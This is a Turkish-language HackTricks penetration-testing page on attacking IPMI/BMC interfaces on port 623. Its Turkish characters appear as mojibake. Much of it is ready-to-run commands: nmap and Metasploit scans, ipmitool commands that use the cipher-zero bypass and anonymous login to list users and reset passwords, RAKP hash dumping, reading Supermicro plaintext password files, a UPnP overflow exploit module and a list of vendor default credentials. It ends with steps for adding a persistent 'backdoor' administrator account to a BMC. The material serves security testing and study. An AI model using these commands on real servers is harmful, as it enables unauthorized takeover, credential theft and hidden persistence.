# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan kahraman seviyesine yÃ¼kseltin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>ile</strong>!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## Temel Bilgiler

### **IPMI Genel BakÄ±ÅŸÄ±**

**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)**, iÅŸletim sisteminden veya gÃ¼Ã§ durumundan baÄŸÄ±msÄ±z olarak bilgisayar sistemlerinin uzaktan yÃ¶netimi ve izlenmesi iÃ§in standart bir yaklaÅŸÄ±m sunar. Bu teknoloji, sistem yÃ¶neticilerinin sistemleri uzaktan yÃ¶netmelerini saÄŸlar, hatta kapalÄ± veya tepkisiz olduklarÄ±nda bile ve Ã¶zellikle ÅŸunlar iÃ§in kullanÄ±ÅŸlÄ±dÄ±r:

- Ã–n-Ä°ÅŸletim Sistemi (Pre-OS) yapÄ±landÄ±rmalarÄ±
- GÃ¼Ã§ kapalÄ± yÃ¶netimi
- Sistem arÄ±zalarÄ±ndan kurtarma

IPMI, sÄ±caklÄ±klarÄ±, voltajlarÄ±, fan hÄ±zlarÄ±nÄ± ve gÃ¼Ã§ kaynaklarÄ±nÄ± izleyebilirken, envanter bilgileri saÄŸlayabilir, donanÄ±m gÃ¼nlÃ¼klerini inceleyebilir ve SNMP aracÄ±lÄ±ÄŸÄ±yla uyarÄ±lar gÃ¶nderebilir. Ä°ÅŸletimi iÃ§in bir gÃ¼Ã§ kaynaÄŸÄ± ve bir LAN baÄŸlantÄ±sÄ± gereklidir.

Intel tarafÄ±ndan 1998 yÄ±lÄ±nda tanÄ±tÄ±ldÄ±ÄŸÄ±ndan beri, IPMI birÃ§ok satÄ±cÄ± tarafÄ±ndan desteklenmiÅŸ ve Ã¶zellikle 2.0 sÃ¼rÃ¼mÃ¼nÃ¼n seri Ã¼zerinden LAN desteÄŸi ile uzaktan yÃ¶netim yeteneklerini geliÅŸtirmiÅŸtir. Ana bileÅŸenler ÅŸunlarÄ± iÃ§erir:

- **Baseboard Management Controller (BMC):** IPMI iÅŸlemleri iÃ§in ana mikrodenetleyici.
- **Ä°letiÅŸim VeriyollarÄ± ve ArayÃ¼zler:** Dahili ve harici iletiÅŸim iÃ§in, ICMB, IPMB ve yerel ve aÄŸ baÄŸlantÄ±larÄ± iÃ§in Ã§eÅŸitli arayÃ¼zler dahil.
- **IPMI BelleÄŸi:** GÃ¼nlÃ¼klerin ve verilerin depolanmasÄ± iÃ§in.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**VarsayÄ±lan Port**: 623/UDP/TCP (Genellikle UDP Ã¼zerinde Ã§alÄ±ÅŸÄ±r, ancak TCP Ã¼zerinde Ã§alÄ±ÅŸabilir)

## Enumerasyon

### KeÅŸif
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
**SÃ¼rÃ¼mÃ¼** belirlemek iÃ§in ÅŸunlarÄ± yapabilirsiniz:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI Zafiyetleri

IPMI 2.0 dÃ¼nyasÄ±nda, Dan Farmer tarafÄ±ndan keÅŸfedilen Ã¶nemli bir gÃ¼venlik aÃ§Ä±ÄŸÄ±, **ÅŸifre tÃ¼rÃ¼ 0** Ã¼zerinden ortaya Ã§Ä±karÄ±ldÄ±. Bu zafiyet, [Dan Farmer'Ä±n araÅŸtÄ±rmasÄ±nda](http://fish2.com/ipmi/cipherzero.html) detaylÄ± olarak belgelenmiÅŸtir ve geÃ§erli bir kullanÄ±cÄ± hedef alÄ±ndÄ±ÄŸÄ±nda herhangi bir ÅŸifre ile yetkisiz eriÅŸime izin verir. Bu zayÄ±flÄ±k, HP, Dell ve Supermicro gibi Ã¼reticilerin Ã§eÅŸitli BMC'lerinde bulunmuÅŸ ve tÃ¼m IPMI 2.0 uygulamalarÄ±nda yaygÄ±n bir soruna iÅŸaret etmiÅŸtir.

### **Åifre 0 AracÄ±lÄ±ÄŸÄ±yla IPMI Kimlik DoÄŸrulama Atlama**

Bu zafiyeti tespit etmek iÃ§in aÅŸaÄŸÄ±daki Metasploit yardÄ±mcÄ± tarama aracÄ± kullanÄ±labilir:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
Bu aÃ§Ä±ÄŸÄ±n istismarÄ±, aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi `ipmitool` ile gerÃ§ekleÅŸtirilebilir ve kullanÄ±cÄ± ÅŸifrelerinin listelenmesine ve deÄŸiÅŸtirilmesine olanak tanÄ±r:

```plaintext
$ ipmitool -I lanplus -H <target_IP> -U <username> -P <password> user list
$ ipmitool -I lanplus -H <target_IP> -U <username> -P <password> user set password <user_ID> <new_password>
```

Bu komutlar, hedef IP adresine sahip bir sunucuda belirli bir kullanÄ±cÄ±nÄ±n ÅŸifresini listelemek ve deÄŸiÅŸtirmek iÃ§in kullanÄ±lÄ±r.
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP Kimlik DoÄŸrulama Uzaktan Parola Hash AlÄ±mÄ±**

Bu zafiyet, herhangi bir mevcut kullanÄ±cÄ± adÄ± iÃ§in tuzlanmÄ±ÅŸ karmaÅŸÄ±k parolalarÄ±n (MD5 ve SHA1) alÄ±nmasÄ±nÄ± saÄŸlar. Bu zafiyeti test etmek iÃ§in Metasploit bir modÃ¼l sunar:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI Anonim Kimlik DoÄŸrulama**

BirÃ§ok BMC'de varsayÄ±lan yapÄ±landÄ±rma, boÅŸ kullanÄ±cÄ± adÄ± ve ÅŸifre dizeleriyle karakterize edilen "anonim" eriÅŸime izin verir. Bu yapÄ±landÄ±rma, `ipmitool` kullanarak adlandÄ±rÄ±lmÄ±ÅŸ kullanÄ±cÄ± hesaplarÄ±nÄ±n ÅŸifrelerini sÄ±fÄ±rlamak iÃ§in istismar edilebilir:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI AÃ§Ä±k Metin Åifreleri**

IPMI 2.0'deki kritik bir tasarÄ±m seÃ§imi, kimlik doÄŸrulama amaÃ§larÄ± iÃ§in BMC'lerde aÃ§Ä±k metin ÅŸifrelerin depolanmasÄ±nÄ± gerektirir. Supermicro'nun bu ÅŸifreleri `/nv/PSBlock` veya `/nv/PSStore` gibi konumlarda depolamasÄ± ciddi gÃ¼venlik endiÅŸelerine neden olur:
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP Zafiyeti**

Supermicro'nun IPMI firmware'inde UPnP SSDP dinleyicisinin bulunmasÄ±, Ã¶zellikle UDP portu 1900 Ã¼zerinde, ciddi bir gÃ¼venlik riski oluÅŸturur. Intel SDK for UPnP Devices sÃ¼rÃ¼m 1.3.1'deki zafiyetler, [Rapid7'nin aÃ§Ä±klamasÄ±nda](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play) detaylÄ± olarak belirtilmiÅŸtir ve BMC'ye kÃ¶k eriÅŸim saÄŸlar.
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP, Integrated Lights Out (iLO)** Ã¼rÃ¼nÃ¼nde **Ã¼retim sÄ±rasÄ±nda varsayÄ±lan ÅŸifreyi rastgeleleÅŸtirir**. Bu uygulama, diÄŸer Ã¼reticilerin aksine, genellikle **sabit varsayÄ±lan kimlik bilgileri** kullanÄ±r. Ã‡eÅŸitli Ã¼rÃ¼nler iÃ§in varsayÄ±lan kullanÄ±cÄ± adlarÄ± ve ÅŸifrelerinin Ã¶zeti aÅŸaÄŸÄ±da verilmiÅŸtir:

- **HP Integrated Lights Out (iLO)**, varsayÄ±lan ÅŸifre olarak **fabrika tarafÄ±ndan rastgeleleÅŸtirilmiÅŸ 8 karakterlik bir dize** kullanÄ±r ve daha yÃ¼ksek bir gÃ¼venlik seviyesini sergiler.
- **Dell'in iDRAC, IBM'in IMM** ve **Fujitsu'nun Integrated Remote Management Controller** gibi Ã¼rÃ¼nler, sÄ±rasÄ±yla "calvin", "PASSW0RD" (sÄ±fÄ±r ile), ve "admin" gibi kolay tahmin edilebilir ÅŸifreler kullanÄ±r.
- Benzer ÅŸekilde, **Supermicro IPMI (2.0), Oracle/Sun ILOM** ve **ASUS iKVM BMC** de "ADMIN", "changeme" ve "admin" gibi basit varsayÄ±lan kimlik bilgilerini kullanÄ±r.

## BMC AracÄ±lÄ±ÄŸÄ±yla Ana Bilgisayara EriÅŸim

Ana kart YÃ¶netim Denetleyicisi'nin (BMC) yÃ¶netici eriÅŸimi, ana bilgisayarÄ±n iÅŸletim sistemine eriÅŸmek iÃ§in Ã§eÅŸitli yollar aÃ§ar. Basit bir yaklaÅŸÄ±m, BMC'nin Klavye, Video, Fare (KVM) iÅŸlevselliÄŸini sÃ¶mÃ¼rmektir. Bunun iÃ§in ya ana bilgisayarÄ± GRUB Ã¼zerinden (`init=/bin/sh` kullanarak) bir kÃ¶k kabuÄŸuna yeniden baÅŸlatmak ya da kurtarma diski olarak ayarlanmÄ±ÅŸ bir sanal CD-ROM'dan baÅŸlatmak yeterlidir. Bu yÃ¶ntemler, ana bilgisayarÄ±n diskinin doÄŸrudan manipÃ¼lasyonunu, arka kapÄ±larÄ±n eklenmesini, veri Ã§Ä±karÄ±lmasÄ±nÄ± veya gÃ¼venlik deÄŸerlendirmesi iÃ§in gereken herhangi bir iÅŸlemi mÃ¼mkÃ¼n kÄ±lar. Ancak, bu, ana bilgisayarÄ± yeniden baÅŸlatmayÄ± gerektirir ve bu Ã¶nemli bir dezavantajdÄ±r. Yeniden baÅŸlatma olmadan, Ã§alÄ±ÅŸan ana bilgisayara eriÅŸmek daha karmaÅŸÄ±k ve ana bilgisayarÄ±n yapÄ±landÄ±rmasÄ±na baÄŸlÄ± olarak deÄŸiÅŸir. EÄŸer ana bilgisayarÄ±n fiziksel veya seri konsolu oturum aÃ§Ä±k kalÄ±yorsa, BMC'nin KVM veya seri Ã¼zerinden aÄŸ (sol) iÅŸlevselliÄŸi aracÄ±lÄ±ÄŸÄ±yla kolayca ele geÃ§irilebilir. i2c veri yolu ve Super I/O Ã§ipi gibi paylaÅŸÄ±lan donanÄ±m kaynaklarÄ±nÄ±n sÃ¶mÃ¼rÃ¼lmesi, daha fazla araÅŸtÄ±rma gerektiren bir alandÄ±r.

## Ana Bilgisayardan BMC'ye Arka KapÄ± Eklemek

Bir BMC ile donatÄ±lmÄ±ÅŸ bir ana bilgisayarÄ± ele geÃ§irdikten sonra, **yerel BMC arayÃ¼zÃ¼ kullanÄ±larak bir arka kapÄ± kullanÄ±cÄ± hesabÄ± eklemek** ve sunucuda kalÄ±cÄ± bir varlÄ±k oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r. Bu saldÄ±rÄ±, ele geÃ§irilen ana bilgisayarda **`ipmitool`**'un bulunmasÄ±nÄ± ve BMC sÃ¼rÃ¼cÃ¼ desteÄŸinin etkinleÅŸtirilmesini gerektirir. AÅŸaÄŸÄ±daki komutlar, bir yeni kullanÄ±cÄ± hesabÄ±nÄ±n, kimlik doÄŸrulamasÄ± gerektirmeyen yerel arayÃ¼zÃ¼ kullanarak BMC'ye nasÄ±l enjekte edileceÄŸini gÃ¶stermektedir. Bu teknik, Linux, Windows, BSD ve hatta DOS gibi geniÅŸ bir iÅŸletim sistemleri yelpazesinde uygulanabilir.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## Referanslar

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
